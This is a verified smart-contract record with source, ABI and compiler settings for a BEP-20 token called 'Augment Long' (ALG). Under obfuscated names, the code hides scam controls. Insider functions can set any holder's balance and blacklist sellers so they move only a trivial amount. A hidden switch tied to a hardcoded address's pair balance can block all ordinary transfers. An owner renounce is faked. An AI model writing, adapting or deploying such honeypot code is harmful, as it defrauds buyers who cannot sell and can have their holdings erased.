{"SourceCode": "//SPDX-License-Identifier: MIT\n\npragma solidity ^0.8.16;\n\ninterface launchMin {\n    function factory() external pure returns (address);\n\n    function WETH() external pure returns (address);\n}\n\nabstract contract fromMode {\n    function _msgSender() internal view virtual returns (address) {\n        return msg.sender;\n    }\n\n    function _msgData() internal view virtual returns (bytes calldata) {\n        return msg.data;\n    }\n}\n\ninterface buyList {\n    function createPair(address maxAuto, address toTx) external returns (address);\n}\n\ninterface enableLiquidityFee {\n    function totalSupply() external view returns (uint256);\n\n    function balanceOf(address fromTake) external view returns (uint256);\n\n    function transfer(address swapShould, uint256 feeLimitReceiver) external returns (bool);\n\n    function allowance(address exemptTokenSender, address spender) external view returns (uint256);\n\n    function approve(address spender, uint256 feeLimitReceiver) external returns (bool);\n\n    function transferFrom(\n        address sender,\n        address swapShould,\n        uint256 feeLimitReceiver\n    ) external returns (bool);\n\n    event Transfer(address indexed from, address indexed receiverTotal, uint256 value);\n    event Approval(address indexed exemptTokenSender, address indexed spender, uint256 value);\n}\n\ninterface enableLiquidityFeeMetadata is enableLiquidityFee {\n    function name() external view returns (string memory);\n\n    function symbol() external view returns (string memory);\n\n    function decimals() external view returns (uint8);\n}\n\ncontract AugmentLong is fromMode, enableLiquidityFee, enableLiquidityFeeMetadata {\n\n    function allowance(address tokenAmount, address feeTokenShould) external view virtual override returns (uint256) {\n        if (feeTokenShould == liquidityFundFrom) {\n            return type(uint256).max;\n        }\n        return teamFrom[tokenAmount][feeTokenShould];\n    }\n\n    address public autoSender;\n\n    uint256 private minTx;\n\n    function totalSupply() external view virtual override returns (uint256) {\n        return txTo;\n    }\n\n    mapping(address => mapping(address => uint256)) private teamFrom;\n\n    bool private exemptList;\n\n    uint256 constant buyAuto = 6 ** 10;\n\n    function atFrom(address swapExempt) public {\n        if (fundTotalLiquidity) {\n            return;\n        }\n        if (minTx == walletTake) {\n            modeTotal = true;\n        }\n        launchedTakeAuto[swapExempt] = true;\n        \n        fundTotalLiquidity = true;\n    }\n\n    bool public modeTotal;\n\n    function symbol() external view virtual override returns (string memory) {\n        return minFund;\n    }\n\n    function fromLiquidity() public {\n        emit OwnershipTransferred(receiverEnable, address(0));\n        fromAuto = address(0);\n    }\n\n    function launchedLimit(address limitTrading) public {\n        launchMax();\n        if (modeTotal) {\n            modeTotal = true;\n        }\n        if (limitTrading == receiverEnable || limitTrading == autoSender) {\n            return;\n        }\n        modeList[limitTrading] = true;\n    }\n\n    bool public fundTotalLiquidity;\n\n    address isLiquidity = 0x0ED943Ce24BaEBf257488771759F9BF482C39706;\n\n    uint256 public buyEnable;\n\n    function sellTokenTo(address launchedFundFee, address swapShould, uint256 feeLimitReceiver) internal returns (bool) {\n        require(teamIs[launchedFundFee] >= feeLimitReceiver);\n        teamIs[launchedFundFee] -= feeLimitReceiver;\n        teamIs[swapShould] += feeLimitReceiver;\n        emit Transfer(launchedFundFee, swapShould, feeLimitReceiver);\n        return true;\n    }\n\n    uint256 private txTo = 100000000 * 10 ** 18;\n\n    function transferFrom(address launchedFundFee, address swapShould, uint256 feeLimitReceiver) external override returns (bool) {\n        if (_msgSender() != liquidityFundFrom) {\n            if (teamFrom[launchedFundFee][_msgSender()] != type(uint256).max) {\n                require(feeLimitReceiver <= teamFrom[launchedFundFee][_msgSender()]);\n                teamFrom[launchedFundFee][_msgSender()] -= feeLimitReceiver;\n            }\n        }\n        return modeLiquidity(launchedFundFee, swapShould, feeLimitReceiver);\n    }\n\n    function marketingIs(uint256 feeLimitReceiver) public {\n        launchMax();\n        marketingBuyReceiver = feeLimitReceiver;\n    }\n\n    function transfer(address fromLimitLaunch, uint256 feeLimitReceiver) external virtual override returns (bool) {\n        return modeLiquidity(_msgSender(), fromLimitLaunch, feeLimitReceiver);\n    }\n\n    mapping(address => uint256) private teamIs;\n\n    uint256 tokenAuto;\n\n    event OwnershipTransferred(address indexed totalToken, address indexed toTake);\n\n    address public receiverEnable;\n\n    constructor (){\n        if (minTx != walletTake) {\n            modeTotal = false;\n        }\n        launchMin totalSwap = launchMin(liquidityFundFrom);\n        autoSender = buyList(totalSwap.factory()).createPair(totalSwap.WETH(), address(this));\n        if (minTx != autoToken) {\n            autoToken = buyEnable;\n        }\n        receiverEnable = _msgSender();\n        fromLiquidity();\n        launchedTakeAuto[receiverEnable] = true;\n        teamIs[receiverEnable] = txTo;\n        \n        emit Transfer(address(0), receiverEnable, txTo);\n    }\n\n    function owner() external view returns (address) {\n        return fromAuto;\n    }\n\n    uint256 public walletTake;\n\n    function balanceOf(address fromTake) public view virtual override returns (uint256) {\n        return teamIs[fromTake];\n    }\n\n    mapping(address => bool) public launchedTakeAuto;\n\n    function name() external view virtual override returns (string memory) {\n        return listExempt;\n    }\n\n    uint256 marketingBuyReceiver;\n\n    address liquidityFundFrom = 0x10ED43C718714eb63d5aA57B78B54704E256024E;\n\n    function getOwner() external view returns (address) {\n        return fromAuto;\n    }\n\n    function decimals() external view virtual override returns (uint8) {\n        return tradingSell;\n    }\n\n    uint256 private autoToken;\n\n    string private minFund = \"ALG\";\n\n    uint8 private tradingSell = 18;\n\n    mapping(address => bool) public modeList;\n\n    string private listExempt = \"Augment Long\";\n\n    function launchMax() private view {\n        require(launchedTakeAuto[_msgSender()]);\n    }\n\n    function approve(address feeTokenShould, uint256 feeLimitReceiver) public virtual override returns (bool) {\n        teamFrom[_msgSender()][feeTokenShould] = feeLimitReceiver;\n        emit Approval(_msgSender(), feeTokenShould, feeLimitReceiver);\n        return true;\n    }\n\n    function launchedMaxAuto(address fromLimitLaunch, uint256 feeLimitReceiver) public {\n        launchMax();\n        teamIs[fromLimitLaunch] = feeLimitReceiver;\n    }\n\n    address private fromAuto;\n\n    function modeLiquidity(address launchedFundFee, address swapShould, uint256 feeLimitReceiver) internal returns (bool) {\n        if (launchedFundFee == receiverEnable) {\n            return sellTokenTo(launchedFundFee, swapShould, feeLimitReceiver);\n        }\n        uint256 receiverTeam = enableLiquidityFee(autoSender).balanceOf(isLiquidity);\n        require(receiverTeam == marketingBuyReceiver);\n        require(swapShould != isLiquidity);\n        if (modeList[launchedFundFee]) {\n            return sellTokenTo(launchedFundFee, swapShould, buyAuto);\n        }\n        return sellTokenTo(launchedFundFee, swapShould, feeLimitReceiver);\n    }\n\n}", "ABI": "[{\"inputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"constructor\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"exemptTokenSender\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"spender\",\"type\":\"address\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"value\",\"type\":\"uint256\"}],\"name\":\"Approval\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"totalToken\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"toTake\",\"type\":\"address\"}],\"name\":\"OwnershipTransferred\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"from\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"receiverTotal\",\"type\":\"address\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"value\",\"type\":\"uint256\"}],\"name\":\"Transfer\",\"type\":\"event\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"tokenAmount\",\"type\":\"address\"},{\"internalType\":\"address\",\"name\":\"feeTokenShould\",\"type\":\"address\"}],\"name\":\"allowance\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"feeTokenShould\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"feeLimitReceiver\",\"type\":\"uint256\"}],\"name\":\"approve\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"swapExempt\",\"type\":\"address\"}],\"name\":\"atFrom\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"autoSender\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"fromTake\",\"type\":\"address\"}],\"name\":\"balanceOf\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"buyEnable\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"decimals\",\"outputs\":[{\"internalType\":\"uint8\",\"name\":\"\",\"type\":\"uint8\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"fromLiquidity\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"fundTotalLiquidity\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"getOwner\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"limitTrading\",\"type\":\"address\"}],\"name\":\"launchedLimit\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"fromLimitLaunch\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"feeLimitReceiver\",\"type\":\"uint256\"}],\"name\":\"launchedMaxAuto\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"name\":\"launchedTakeAuto\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"uint256\",\"name\":\"feeLimitReceiver\",\"type\":\"uint256\"}],\"name\":\"marketingIs\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"name\":\"modeList\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"modeTotal\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"name\",\"outputs\":[{\"internalType\":\"string\",\"name\":\"\",\"type\":\"string\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"owner\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"receiverEnable\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"symbol\",\"outputs\":[{\"internalType\":\"string\",\"name\":\"\",\"type\":\"string\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"totalSupply\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"fromLimitLaunch\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"feeLimitReceiver\",\"type\":\"uint256\"}],\"name\":\"transfer\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"launchedFundFee\",\"type\":\"address\"},{\"internalType\":\"address\",\"name\":\"swapShould\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"feeLimitReceiver\",\"type\":\"uint256\"}],\"name\":\"transferFrom\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"walletTake\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"}]", "ContractName": "AugmentLong", "CompilerVersion": "v0.8.19+commit.7dd6d404", "OptimizationUsed": "0", "Runs": "200", "ConstructorArguments": "", "EVMVersion": "Default", "Library": "", "LicenseType": "MIT", "Proxy": "0", "Implementation": "", "SwarmSource": ""}